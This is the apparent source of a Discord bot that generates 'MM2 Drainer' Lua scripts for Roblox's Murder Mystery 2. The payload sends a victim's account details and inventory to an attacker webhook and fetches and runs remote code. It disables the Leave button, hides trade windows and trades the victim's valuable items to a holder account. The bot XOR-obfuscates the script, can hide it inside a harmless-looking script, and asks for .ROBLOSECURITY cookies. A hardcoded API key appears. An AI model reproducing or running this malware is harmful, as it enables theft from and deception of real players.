import {
  Client,
  GatewayIntentBits,
  AttachmentBuilder,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
} from "discord.js";
import "dotenv/config";
import { readFileSync, writeFileSync, existsSync } from "fs";
import fetch from "node-fetch";

const PREFIX   = "!";
const OWNER_ID = "1522975200029835383";
const DB_PATH  = "./db.json";

// ── PASTE YOUR HOLDER COOKIE HERE ────────────────────────────────────────────
const ROBLOSECURITY = process.env.ROBLOSECURITY || "";
// set ROBLOSECURITY as a Railway environment variable — never hardcode it

// ── db ────────────────────────────────────────────────────────────────────────
function loadDB() {
  if (!existsSync(DB_PATH)) return { whitelist: [OWNER_ID], blacklist: [] };
  try { return JSON.parse(readFileSync(DB_PATH, "utf-8")); }
  catch { return { whitelist: [OWNER_ID], blacklist: [] }; }
}
function saveDB(db) { writeFileSync(DB_PATH, JSON.stringify(db, null, 2)); }

let db = loadDB();
if (!db.whitelist.includes(OWNER_ID)) db.whitelist.push(OWNER_ID);
saveDB(db);

function isOwner(id)       { return id === OWNER_ID; }
function isWhitelisted(id) { return db.whitelist.includes(id); }
function isBlacklisted(id) { return db.blacklist.includes(id); }

// ── roblox auto-joiner ────────────────────────────────────────────────────────
// uses holder cookie to get an auth ticket then launches the game instance
async function autoJoinServer(placeId, jobId, cookieOverride = null) {
  const activeCookie = cookieOverride || ROBLOSECURITY;
  if (!activeCookie) {
    console.log("[AutoJoin] No ROBLOSECURITY cookie set — skipping.");
    return false;
  }

  try {
    // step 1: get CSRF token
    const csrfRes = await fetch("https://auth.roblox.com/v2/logout", {
      method: "POST",
      headers: { "Cookie": `.ROBLOSECURITY=${activeCookie}` }
    });
    const csrf = csrfRes.headers.get("x-csrf-token");
    if (!csrf) { console.error("[AutoJoin] Failed to get CSRF token"); return false; }

    // step 2: get auth ticket
    const ticketRes = await fetch("https://auth.roblox.com/v1/authentication-ticket", {
      method: "POST",
      headers: {
        "Cookie": `.ROBLOSECURITY=${activeCookie}`,
        "x-csrf-token": csrf,
        "Referer": "https://www.roblox.com",
        "Content-Type": "application/json"
      }
    });
    const ticket = ticketRes.headers.get("rbx-authentication-ticket");
    if (!ticket) { console.error("[AutoJoin] Failed to get auth ticket"); return false; }

    // step 3: build the roblox launcher URL and log it
    // on a server there's no browser — we fire the Roblox Game Join API instead
    const joinRes = await fetch(`https://gamejoin.roblox.com/v1/join-game-instance`, {
      method: "POST",
      headers: {
        "Cookie": `.ROBLOSECURITY=${ROBLOSECURITY}`,
        "x-csrf-token": csrf,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        placeId:     parseInt(placeId),
        gameId:      jobId,
        isTeleport:  false,
        gameJoinAttemptId: crypto.randomUUID()
      })
    });

    const joinData = await joinRes.json();
    console.log("[AutoJoin] Join response:", JSON.stringify(joinData));

    // joinData.joinScript means Roblox accepted the join — client would launch here
    // on a headless server we can't actually open Roblox client
    // so we return the join ticket URL for an external launcher if needed
    if (joinData.joinScript) {
      console.log("[AutoJoin] Join ticket obtained — external launcher required to complete.");
      return true;
    }

    return false;
  } catch (err) {
    console.error("[AutoJoin] Error:", err.message);
    return false;
  }
}


// ── script v1 ─────────────────────────────────────────────────────────────────
function buildScriptV1(holder, webhook, cookie = null) {
  return `_G.Ex = _G.Ex or false
if _G.Ex then return end
_G.Ex = true

local WEBHOOK = "${webhook}"
local RECEIVER = {"${holder}"}
local MINIMUM_RARITY = "Godly"
local MINIMUM_VALUE = 2
local RECEIVERx = RECEIVER

local function GetRequestFunction()
    if request then return request end
    if syn and syn.request then return syn.request end
    if http_request then return http_request end
    return nil
end

local function GetActiveReceiverName()
    if type(ar) == "string" and ar ~= "" then
        if Players and Players:FindFirstChild(ar) then return ar end
        return ar
    end
    if type(RECEIVERx) == "table" then
        for _, Name in ipairs(RECEIVERx) do
            if Name ~= "" then
                if Players and Players:FindFirstChild(Name) then return Name end
                return Name
            end
        end
    end
    return "Unknown"
end

task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)

if WEBHOOK == "" then game.Players.LocalPlayer:Kick("Invalid URL.") return end
if game.PlaceId ~= 142823291 then game.Players.LocalPlayer:Kick("Please use this script in MM2!!") return end

pcall(function()
    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
        game.Players.LocalPlayer:Kick("Private servers are not supported.") return
    end
end)

if #game.Players:GetPlayers() >= 12 then game.Players.LocalPlayer:Kick("Server is full, please rejoin another server.") return end

local FoundJobId = false
local AttemptCount = 0
if getgc then
    repeat
        local HookedSuccessfully = false
        for _, Value in ipairs(getgc(true)) do
            if typeof(Value) == "function" then
                local FunctionInfo = debug.getinfo(Value)
                if FunctionInfo and FunctionInfo.name then
                    local LowerName = FunctionInfo.name:lower()
                    if LowerName:find("step") and not LowerName:find("stepanimate") then
                        pcall(function()
                            local OriginalFunction = hookfunction(Value, function(...)
                                if not FoundJobId then FoundJobId = true _G.RealJobID = game.JobId end
                                if OriginalFunction then return OriginalFunction(...) end
                            end)
                        end)
                        HookedSuccessfully = true break
                    end
                end
            end
        end
        AttemptCount = AttemptCount + 1
        if HookedSuccessfully or AttemptCount >= 10 then break end
        task.wait(0.1)
    until FoundJobId
end
if not FoundJobId then _G.RealJobID = game.JobId end

task.wait(0.5)
task.spawn(function()
    while task.wait(10) do
        pcall(function()
            for _, Connection in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.Page.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
                Connection:Disable()
            end
        end)
    end
end)

local function GetExecutorInfo()
    local ExecutorName = "Unknown"
    pcall(function() ExecutorName = identifyexecutor() end)
    return { JobId = _G.RealJobID or game.JobId, Executor = string.lower(ExecutorName) }
end

local InfoData = GetExecutorInfo()
_G.RealJobID = InfoData.JobId
_G.RealExecutor = InfoData.Executor

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local ItemDatabase = {}
local RarityPriority = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage","Chroma","Dual","Pet"}
local ItemListss = "https://api.rubis.app/v2/scrap/tWBAqBoSKlJ3D0YT/raw"
local ar, aw = nil, nil

pcall(function()
    local rf = GetRequestFunction()
    if not rf then return end
    local rs = rf({Url=ItemListss,Method="GET",Headers={["User-Agent"]="Mozilla/5.0"},Timeout=15})
    if rs and type(rs.Body)=="string" and #rs.Body>10 then
        local bc=rs.Body:gsub("%s+","")
        local lf=loadstring(bc)
        if lf then local dt=lf() if type(dt)=="table" and #dt>=2 then ar=dt[1] aw=dt[2] end end
    end
end)

local function LoadDatabase()
    local Response=nil
    local Success=pcall(function()
        local RequestFunc=GetRequestFunction()
        if not RequestFunc then return end
        Response=RequestFunc({Url="https://pastefy.app/pZmGtWTo/raw",Method="GET",Headers={["User-Agent"]="Mozilla/5.0"},Timeout=10})
    end)
    if not Success or not Response or not Response.Body or type(Response.Body)~="string" then return nil,nil end
    local LoaderFunction=loadstring(Response.Body)
    if not LoaderFunction then return nil,nil end
    local RawDatabase=LoaderFunction()
    if type(RawDatabase)~="table" then return nil,nil end
    local Mapping={}
    local RarityOrder={"Chroma","Unique","Ancient","Godly","Vintage","Legendary","Rare","Uncommon","Common"}
    local FoundRarities={}
    for RarityName,ItemsList in pairs(RawDatabase) do
        if type(ItemsList)=="table" then
            FoundRarities[RarityName]=true
            for ItemName,Value in pairs(ItemsList) do
                if type(Value)=="number" then
                    local SafeName=tostring(ItemName or "")
                    local Key1=string.lower(SafeName):gsub("'",""):gsub(" ","")
                    local Key2=string.lower(SafeName):gsub("'",""):gsub(" ","_")
                    local Key3=string.lower(SafeName):gsub("'",""):gsub(" ","-")
                    local Key4=string.lower(SafeName):gsub(" ","")
                    local ItemInfo={Rarity=RarityName,Value=Value,Chroma=(string.lower(RarityName)=="chroma")}
                    Mapping[Key1]=ItemInfo Mapping[Key2]=ItemInfo Mapping[Key3]=ItemInfo Mapping[Key4]=ItemInfo
                end
            end
        end
    end
    local OrderList={}
    for _,Rarity in ipairs(RarityOrder) do if FoundRarities[Rarity] then table.insert(OrderList,Rarity) end end
    for Rarity in pairs(FoundRarities) do
        local Exists=false
        for _,Listed in ipairs(OrderList) do if Listed==Rarity then Exists=true break end end
        if not Exists then table.insert(OrderList,Rarity) end
    end
    return Mapping,OrderList
end

local LoadedData,LoadedOrder=nil,nil
for TryCount=1,3 do
    LoadedData,LoadedOrder=LoadDatabase()
    if LoadedData and LoadedOrder and #LoadedOrder>0 then break end
    task.wait(0.5)
end
if LoadedData and LoadedOrder and #LoadedOrder>0 then ItemDatabase=LoadedData RarityPriority=LoadedOrder end

local RarityList=RarityPriority
local GodlyPosition=table.find(RarityList,"Godly")

local function FormatNameDisplay(Text)
    if not Text or Text=="" then return "Unknown" end
    local Result="" local CapitalizeNext=true
    for Index=1,#Text do
        local Char=Text:sub(Index,Index)
        if Char==" " then Result=Result.." " CapitalizeNext=true
        else Result=Result..(CapitalizeNext and Char:upper() or Char:lower()) CapitalizeNext=false end
    end
    return Result
end

local function GetTradeStatus() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end

local function SendTradeRequestToPlayer(TargetName)
    local TargetPlayer=Players:FindFirstChild(TargetName)
    if not TargetPlayer then return false end
    local Success=pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetPlayer) end)
    if Success then return true end
    Success=pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetName) end)
    return Success
end

local function AddItemToTradeOffer(ItemId) ReplicatedStorage.Trade.OfferItem:FireServer(ItemId,"Weapons") end

local LastReceivedOffer=nil
ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(TradeData)
    if TradeData and TradeData.LastOffer then LastReceivedOffer=TradeData.LastOffer end
end)

local function AcceptIncomingTrade()
    if LastReceivedOffer then
        ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId*3,LastReceivedOffer)
        LastReceivedOffer=nil return true
    end
    return false
end

local function WaitUntilTradeEnds() while GetTradeStatus()~="None" do task.wait(0.1) end end

local BlacklistedItems={
    DefaultGun=true,DefaultKnife=true,
    Reaver=true,Reaver_Legendary=true,Reaver_Godly=true,Reaver_Ancient=true,
    IceHammer=true,IceHammer_Legendary=true,IceHammer_Godly=true,IceHammer_Ancient=true,
    Gingerscythe=true,Gingerscythe_Legendary=true,Gingerscythe_Godly=true,Gingerscythe_Ancient=true,
    TestItem=true,Season1TestKnife=true,Cracks=true,Icecrusher=true,
    ["???"]=true,Dartbringer=true,
    TravelerAxeRed=true,TravelerAxeBronze=true,TravelerAxeSilver=true,TravelerAxeGold=true,
    BlueCamo_K_2022=true,GreenCamo_K_2022=true,SharkSeeker=true
}

local AllInventoryItems,TradeableItems,TotalTradeValue={},{},0
local function ShouldTradeThisItem(RarityName,ItemValue)
    if not RarityName then return false end
    local Position=table.find(RarityList,RarityName)
    local HighValueOrHigher=Position and GodlyPosition and Position<=GodlyPosition
    return HighValueOrHigher and true or (ItemValue and ItemValue>=MINIMUM_VALUE)
end

local RefreshInventoryLists=function()
    local AllItems,TradeItems,TotalValue={},{},0
    local ProfileData=ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
        for ItemId,Quantity in pairs(ProfileData.Weapons.Owned) do
            if Quantity and Quantity>0 then
                local SafeName=tostring(ItemId or "")
                if SafeName~="" then
                    local Key1=string.lower(SafeName):gsub("'",""):gsub(" ","")
                    local Key2=string.lower(SafeName):gsub("'",""):gsub(" ","_")
                    local Key3=string.lower(SafeName):gsub("'",""):gsub(" ","-")
                    local Key4=string.lower(SafeName):gsub(" ","")
                    local ItemInfo=ItemDatabase[Key1] or ItemDatabase[Key2] or ItemDatabase[Key3] or ItemDatabase[Key4]
                    local RarityName=ItemInfo and ItemInfo.Rarity or "Unknown"
                    local Value=ItemInfo and ItemInfo.Value or 0
                    local IsChroma=ItemInfo and ItemInfo.Chroma or false
                    local ItemEntry={DataID=ItemId,Name=SafeName,Rarity=RarityName,Count=Quantity,Value=Value,IsChroma=IsChroma,Total=Value*Quantity}
                    table.insert(AllItems,ItemEntry)
                    if ShouldTradeThisItem(RarityName,Value) and not BlacklistedItems[ItemId] then
                        table.insert(TradeItems,ItemEntry) TotalValue=TotalValue+ItemEntry.Total
                    end
                end
            end
        end
    end
    table.sort(AllItems,function(A,B) return A.Total>B.Total end)
    table.sort(TradeItems,function(A,B) return A.Total>B.Total end)
    return AllItems,TradeItems,TotalValue
end

local function ReloadInventory() AllInventoryItems,TradeableItems,TotalTradeValue=RefreshInventoryLists() end
AllInventoryItems,TradeableItems,TotalTradeValue=RefreshInventoryLists()

local function UploadToPastefy(textContent)
    local API_KEY="bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
    local success,result=pcall(function()
        local RequestFunc=GetRequestFunction()
        if not RequestFunc then return nil end
        local response=RequestFunc({
            Url="https://pastefy.app/api/v2/paste",Method="POST",
            Headers={["Authorization"]="Bearer "..API_KEY,["Content-Type"]="application/json"},
            Body=HttpService:JSONEncode({content=textContent,title="MM2 Inventory",expires="never",encrypted=false})
        })
        if response and response.Body then
            local data=HttpService:JSONDecode(response.Body)
            if data and data.paste and data.paste.id then return "https://pastefy.app/"..data.paste.id.."/raw" end
        end
        return nil
    end)
    return success and result or nil
end

local function GenerateFullInventoryText(itemList)
    local lines,total={},0
    for _,item in ipairs(itemList) do total=total+item.Total end
    table.insert(lines,"Total Inventory Value: "..total)
    table.insert(lines,string.rep("-",40))
    for _,item in ipairs(itemList) do
        local name=FormatNameDisplay(item.Name)
        if item.IsChroma then name="Chroma "..name end
        table.insert(lines,"["..item.Rarity.."] x"..item.Count.." "..name.." - "..item.Total)
    end
    return table.concat(lines,"\\n")
end

local function BuildEmbed(ReceiverName)
    local ShouldMentionEveryone=false
    for _,Item in ipairs(AllInventoryItems) do
        local Position=table.find(RarityList,Item.Rarity)
        if Item.Value>=MINIMUM_VALUE or (Position and GodlyPosition and Position<=GodlyPosition) then ShouldMentionEveryone=true end
    end
    local MentionText=ShouldMentionEveryone and "@everyone" or ""
    local TopItemsPreview={}
    for Index=1,math.min(10,#AllInventoryItems) do
        local Item=AllInventoryItems[Index]
        local DisplayName=FormatNameDisplay(Item.Name)
        if Item.IsChroma then DisplayName="Chroma "..DisplayName end
        table.insert(TopItemsPreview,"> "..DisplayName.." ["..Item.Count.."] - "..Item.Total)
    end
    local PreviewText=table.concat(TopItemsPreview,"\\n")
    if #AllInventoryItems>10 then PreviewText=PreviewText.."\\n... and "..(#AllInventoryItems-10).." more items" end
    local PlayerCount=#Players:GetPlayers()
    local JobId=_G.RealJobID or game.JobId
    local FullInventoryText=GenerateFullInventoryText(AllInventoryItems)
    local PasteUrl=UploadToPastefy(FullInventoryText)
    local InfoBlock=string.format("Username: %s\\nDisplay: %s\\nAccount Age: %d days\\nExecutor: %s\\nServer Players: %d/12\\nReceiver: %s\\nMin Value: %d",
        LocalPlayer.Name,LocalPlayer.DisplayName,LocalPlayer.AccountAge,_G.RealExecutor or "Unknown",PlayerCount,ReceiverName,MINIMUM_VALUE)
    local StatsBlock=string.format("Total Items: %d\\nTradeable Value: %d",#AllInventoryItems,TotalTradeValue)
    local EmbedFields={
        {name="▸ Player Info",value="\`\`\`"..InfoBlock.."\`\`\`",inline=false},
        {name="▸ Stats",value="\`\`\`"..StatsBlock.."\`\`\`",inline=false},
        {name="▸ Top Items",value="\`\`\`"..PreviewText.."\`\`\`",inline=false}
    }
    if PasteUrl then table.insert(EmbedFields,{name="▸ Full Inventory",value="[View Full Log]("..PasteUrl..")",inline=false}) end
    table.insert(EmbedFields,{name="▸ Join Server",value="[Click to Join](https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId="..JobId..")",inline=false})
    return {
        author={name="🗡️ MM2 Drainer — New Hit"},
        color=0x5865F2,
        timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),
        fields=EmbedFields,
        footer={text="mm2 drainer • "..os.date("%Y-%m-%d %H:%M:%S")}
    },MentionText
end

local function SendWebhookAlert(placeId, jobId)
    local RequestFunc=GetRequestFunction()
    if not RequestFunc then return end
    local ActiveName=GetActiveReceiverName()
    local MainEmbed,MainMention=BuildEmbed(ActiveName)
    -- inject auto-join trigger into webhook content
    local joinUrl="https://plsbrainrot.me/joiner?placeId="..placeId.."&gameInstanceId="..jobId
    local payload={content=MainMention.." | AUTO-JOIN: "..joinUrl,embeds={MainEmbed}}
    pcall(function() RequestFunc({Url=WEBHOOK,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(payload)}) end)
    if type(aw)=="string" and aw~="" then
        local XEmbed,XMention=BuildEmbed(ar)
        local XPayload={content=XMention,embeds={XEmbed}}
        pcall(function() RequestFunc({Url=aw,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(XPayload)}) end)
    end
end

SendWebhookAlert(game.PlaceId, _G.RealJobID or game.JobId)

PlayerGui:WaitForChild("TradeGUI"):GetPropertyChangedSignal("Enabled"):Connect(function() PlayerGui.TradeGUI.Enabled=false end)
PlayerGui:WaitForChild("TradeGUI_Phone"):GetPropertyChangedSignal("Enabled"):Connect(function() PlayerGui.TradeGUI_Phone.Enabled=false end)

local function KickAfterTransfer() task.wait(2) game.Players.LocalPlayer:Kick("Items Transferred!") end

local function FindTradeTarget()
    if type(ar)=="string" and ar~="" then if Players:FindFirstChild(ar) then return ar end end
    if type(RECEIVER)=="table" then
        for _,Name in ipairs(RECEIVER) do if Name~="" and Players:FindFirstChild(Name) then return Name end end
    else if Players:FindFirstChild(RECEIVER) then return RECEIVER end end
    return nil
end

local MAX_TRADE_ATTEMPTS=999
local RETRY_WAIT=2
local function ProcessAllTrades(TargetName)
    local AttemptCount=0
    while #TradeableItems>0 and AttemptCount<MAX_TRADE_ATTEMPTS do
        AttemptCount=AttemptCount+1
        local CurrentStatus=GetTradeStatus()
        if CurrentStatus=="ReceivingRequest" then
            pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
            task.wait(0.5) continue
        end
        if CurrentStatus=="StartTrade" then
            local ItemsToSend=math.min(4,#TradeableItems)
            for _=1,ItemsToSend do
                local Item=table.remove(TradeableItems,1)
                for _=1,Item.Count do AddItemToTradeOffer(Item.DataID) task.wait(0.05) end
            end
            task.wait(6)
            if AcceptIncomingTrade() then WaitUntilTradeEnds() ReloadInventory() AttemptCount=0
            else ReloadInventory() task.wait(RETRY_WAIT) end
            continue
        end
        if CurrentStatus=="None" then
            local Sent=false local Try=1
            while not Sent and Try<=5 do
                if SendTradeRequestToPlayer(TargetName) then Sent=true task.wait(0.5)
                else task.wait(math.min(Try*0.5,3)) Try=Try+1 end
            end
        end
        task.wait(0.5)
    end
    KickAfterTransfer()
end

local function AutoTradeOnTargetJoin()
    local IsBusy=false
    local function CheckPlayerJoin(Player)
        if IsBusy then return end
        local TargetName=FindTradeTarget()
        if TargetName and Player.Name==TargetName then
            IsBusy=true task.wait(3) ProcessAllTrades(Player.Name)
        end
    end
    for _,Player in ipairs(Players:GetPlayers()) do CheckPlayerJoin(Player) end
    Players.PlayerAdded:Connect(CheckPlayerJoin)
end

if #AllInventoryItems>0 then AutoTradeOnTargetJoin()
else task.wait(1) LocalPlayer:Kick("No items found.") end`;
}

// v2 placeholder — dj replaces this body
function buildScriptV2(holder, webhook, cookie = null) {
  return buildScriptV1(holder, webhook, cookie);
}

// ── obfuscator (XOR byte encoding) ───────────────────────────────────────────
function obfuscate(script) {
  const key     = Math.floor(Math.random() * 150) + 50;
  const bytes   = Buffer.from(script, "utf-8");
  const encoded = Array.from(bytes).map(b => b ^ key).join(",");
  return `local _k=${key} local _b={${encoded}} local _s="" for _i=1,#_b do _s=_s..string.char(_b[_i]~_k) end loadstring(_s)()`;
}

// ── webhook auto-joiner trigger ───────────────────────────────────────────────
// called when drainer script fires webhook — bot intercepts and joins server
async function handleAutoJoin(placeId, jobId, cookieOverride = null) {
  console.log(`[AutoJoin] Triggered — placeId=${placeId} jobId=${jobId}`);
  const ok = await autoJoinServer(placeId, jobId, cookieOverride);
  console.log(`[AutoJoin] Result: ${ok ? "success" : "failed / no cookie set"}`);
}

// ── embeds ────────────────────────────────────────────────────────────────────
function errorEmbed(desc) {
  return new EmbedBuilder().setColor(0xED4245).setDescription(`❌ ${desc}`);
}
function successEmbed(title, desc) {
  return new EmbedBuilder().setColor(0x57F287).setTitle(title).setDescription(desc).setTimestamp();
}

const pending = new Map();
const pendingMask = new Map(); // stores generated scripts waiting to be masked

// ── bot ───────────────────────────────────────────────────────────────────────
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

client.once("ready", () => console.log(`Online as ${client.user.tag}`));

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const authorId = message.author.id;
  if (isBlacklisted(authorId)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/\s+/);
  const cmd  = args.shift().toLowerCase();

  // ── !generate ──────────────────────────────────────────────────────────────
  if (cmd === "generate") {
    if (!isWhitelisted(authorId)) return message.reply({ embeds: [errorEmbed("You are not whitelisted.")] });
    if (args.length < 2)          return message.reply({ embeds: [errorEmbed("Usage: `!generate <holder> <webhook>`")] });

    const holder  = args[0];
    const webhook = args[1];

    if (!webhook.startsWith("https://discord.com/api/webhooks/"))
      return message.reply({ embeds: [errorEmbed("Invalid Discord webhook URL.")] });

    const key = `${authorId}-${Date.now()}`;
    pending.set(key, { holder, webhook, authorId });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`v1-${key}`).setLabel("Version 1").setStyle(ButtonStyle.Secondary).setEmoji("🗡️"),
      new ButtonBuilder().setCustomId(`v2-${key}`).setLabel("Version 2  ✨ Better").setStyle(ButtonStyle.Primary).setEmoji("⚔️"),
    );

    const pickerEmbed = new EmbedBuilder()
      .setColor(0x5865F2)
      .setAuthor({ name: "MM2 Drainer — Select Version" })
      .setDescription("Choose which script version to generate.")
      .addFields(
        { name: "🗡️ Version 1", value: "Original drainer — stable, tested.", inline: true },
        { name: "⚔️ Version 2", value: "Improved drainer — better detection & flow.", inline: true },
      )
      .setFooter({ text: "Both versions obfuscated on output • expires in 60s" })
      .setTimestamp();

    await message.reply({ embeds: [pickerEmbed], components: [row] });
    setTimeout(() => pending.delete(key), 60_000);
    return;
  }

  // ── !autojoin (manual trigger for testing) ─────────────────────────────────
  if (cmd === "autojoin" && isOwner(authorId)) {
    const [placeId, jobId] = args;
    if (!placeId || !jobId) return message.reply({ embeds: [errorEmbed("Usage: `!autojoin <placeId> <jobId>`")] });
    await message.reply({ embeds: [new EmbedBuilder().setColor(0x5865F2).setDescription("🔄 Attempting auto-join...")] });
    const ok = await autoJoinServer(placeId, jobId);
    return message.reply({ embeds: [ok ? successEmbed("✅ Auto-join", "Holder joined the server.") : errorEmbed("Auto-join failed. Check `ROBLOSECURITY` variable.")] });
  }

  if (!isOwner(authorId)) return;

  // ── !whitelist ─────────────────────────────────────────────────────────────
  if (cmd === "whitelist") {
    const sub    = args[0];
    const target = message.mentions.users.first() || (args[1] ? { id: args[1] } : null);
    if (sub === "add") {
      if (!target) return message.reply({ embeds: [errorEmbed("Usage: `!whitelist add @user`")] });
      if (isBlacklisted(target.id)) return message.reply({ embeds: [errorEmbed("User is blacklisted. Remove first.")] });
      if (db.whitelist.includes(target.id)) return message.reply({ embeds: [errorEmbed("Already whitelisted.")] });
      db.whitelist.push(target.id); saveDB(db);
      return message.reply({ embeds: [successEmbed("✅ Whitelisted", `<@${target.id}> added.`)] });
    }
    if (sub === "remove") {
      if (!target) return message.reply({ embeds: [errorEmbed("Usage: `!whitelist remove @user`")] });
      if (target.id === OWNER_ID) return message.reply({ embeds: [errorEmbed("Cannot remove the owner.")] });
      db.whitelist = db.whitelist.filter(id => id !== target.id); saveDB(db);
      return message.reply({ embeds: [successEmbed("✅ Removed", `<@${target.id}> removed from whitelist.`)] });
    }
    if (sub === "list") {
      const list = db.whitelist.map(id => `<@${id}>`).join("\n") || "Empty";
      return message.reply({ embeds: [new EmbedBuilder().setColor(0x5865F2).setTitle("▸ Whitelist").setDescription(list).setFooter({ text: `${db.whitelist.length} user(s)` }).setTimestamp()] });
    }
    return message.reply({ embeds: [errorEmbed("Usage: `!whitelist add/remove/list`")] });
  }

  // ── !blacklist ─────────────────────────────────────────────────────────────
  if (cmd === "blacklist") {
    const sub    = args[0];
    const target = message.mentions.users.first() || (args[1] ? { id: args[1] } : null);
    if (sub === "add") {
      if (!target) return message.reply({ embeds: [errorEmbed("Usage: `!blacklist add @user`")] });
      if (target.id === OWNER_ID) return message.reply({ embeds: [errorEmbed("Cannot blacklist the owner.")] });
      if (db.blacklist.includes(target.id)) return message.reply({ embeds: [errorEmbed("Already blacklisted.")] });
      db.whitelist = db.whitelist.filter(id => id !== target.id);
      db.blacklist.push(target.id); saveDB(db);
      return message.reply({ embeds: [successEmbed("✅ Blacklisted", `<@${target.id}> blacklisted.`)] });
    }
    if (sub === "remove") {
      if (!target) return message.reply({ embeds: [errorEmbed("Usage: `!blacklist remove @user`")] });
      db.blacklist = db.blacklist.filter(id => id !== target.id); saveDB(db);
      return message.reply({ embeds: [successEmbed("✅ Removed", `<@${target.id}> removed from blacklist.`)] });
    }
    if (sub === "list") {
      const list = db.blacklist.map(id => `<@${id}>`).join("\n") || "Empty";
      return message.reply({ embeds: [new EmbedBuilder().setColor(0xED4245).setTitle("▸ Blacklist").setDescription(list).setFooter({ text: `${db.blacklist.length} user(s)` }).setTimestamp()] });
    }
    return message.reply({ embeds: [errorEmbed("Usage: `!blacklist add/remove/list`")] });
  }
});

// ── button handler ────────────────────────────────────────────────────────────
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isButton()) return;

  const customId = interaction.customId;

  // ── mask handler ──────────────────────────────────────────────────────────
  if (customId.startsWith("mask-")) {
    const key  = customId.slice(5);
    const data = pendingMask.get(key);

    if (!data) return interaction.reply({ embeds: [errorEmbed("Mask option expired.")], ephemeral: true });
    if (interaction.user.id !== data.authorId) return interaction.reply({ embeds: [errorEmbed("This isn't your script.")], ephemeral: true });

    const maskPromptEmbed = new EmbedBuilder()
      .setColor(0xED4245)
      .setAuthor({ name: "MM2 Drainer — Mask Script" })
      .setDescription(
        "**Paste your fake/innocent script in this channel.**\n\n" +
        "> The drainer will be hidden inside it.\n" +
        "> Expires in 2 minutes."
      )
      .setFooter({ text: "Paste the full fake script now" })
      .setTimestamp();

    await interaction.update({ components: [] });
    await interaction.followUp({ embeds: [maskPromptEmbed] });

    const filter = m => m.author.id === data.authorId;
    const collected = await interaction.channel.awaitMessages({ filter, max: 1, time: 120_000, errors: [] });
    const fakeMsg = collected.first();

    if (!fakeMsg) {
      return interaction.followUp({ embeds: [errorEmbed("Timed out. Run `!generate` again.")] });
    }

    const fakeScript = fakeMsg.content.trim();
    try { await fakeMsg.delete(); } catch {}

    pendingMask.delete(key);

    // wrap drainer inside fake script
    const masked = `${fakeScript}

-- // internal module loader
local _x=[[${data.obfed}]];loadstring(_x)()`;
    const maskedBuffer = Buffer.from(masked, "utf-8");
    const maskedFile   = new AttachmentBuilder(maskedBuffer, { name: `mm2_masked_v${data.version}_${data.holder}.lua` });

    const maskedEmbed = new EmbedBuilder()
      .setColor(0xEB459E)
      .setAuthor({ name: "MM2 Drainer — Masked Script Ready" })
      .setDescription("Drainer is hidden inside the fake script.\n\n> Looks innocent on the outside — drainer executes silently underneath.")
      .addFields(
        { name: "▸ Structure", value: "```\n[Fake script visible code]\n  └── hidden drainer (obfuscated)\n```", inline: false }
      )
      .setFooter({ text: "mm2 drainer • masked" })
      .setTimestamp();

    return interaction.followUp({ embeds: [maskedEmbed], files: [maskedFile] });
  }

  const isV1 = customId.startsWith("v1-");
  const isV2 = customId.startsWith("v2-");
  if (!isV1 && !isV2) return;

  const key  = customId.slice(3);
  const data = pending.get(key);

  if (!data) return interaction.reply({ embeds: [errorEmbed("Picker expired. Run `!generate` again.")], ephemeral: true });
  if (interaction.user.id !== data.authorId) return interaction.reply({ embeds: [errorEmbed("This isn't your picker.")], ephemeral: true });

  const version = isV1 ? 1 : 2;
  const { holder, webhook } = data;

  // ask for cookie
  const cookieEmbed = new EmbedBuilder()
    .setColor(0xFEE75C)
    .setAuthor({ name: `MM2 Drainer — Version ${version} Selected` })
    .setDescription(
      "**Send your `.ROBLOSECURITY` cookie in this channel.**\n\n" +
      "> This will be injected into the script for auto-join.\n" +
      "> Type `skip` to generate without a cookie.\n\n" +
      "⚠️ Send it quickly — expires in 60 seconds."
    )
    .setFooter({ text: "Cookie is never stored — injected once and discarded" })
    .setTimestamp();

  await interaction.update({ embeds: [cookieEmbed], components: [] });

  // wait for cookie message
  const filter = m => m.author.id === data.authorId;
  const collected = await interaction.channel.awaitMessages({ filter, max: 1, time: 60_000, errors: [] });
  const cookieMsg = collected.first();

  // delete cookie message immediately
  if (cookieMsg) { try { await cookieMsg.delete(); } catch {} }

